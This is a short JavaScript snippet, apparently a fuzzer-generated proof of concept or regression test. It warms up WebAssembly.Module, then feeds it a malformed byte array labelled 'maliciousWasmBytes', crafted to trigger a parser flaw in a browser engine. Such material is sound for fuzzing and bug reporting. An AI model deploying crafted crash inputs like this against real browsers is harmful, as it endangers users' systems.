const v12 = new Uint8Array([0,97,115,109,1,0,0,0]);
const warmUpWasm = v12;
for (let v14 = 0; v14 < 100; v14++) {
    try {
        const t4 = WebAssembly.Module;
        new t4(warmUpWasm);
    } catch(e18) {
    }
}
const v50 = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,0,128,128,128,128,8]);
const maliciousWasmBytes = v50;
try {
    const t12 = WebAssembly.Module;
    new t12(maliciousWasmBytes);
} catch(e55) {
}
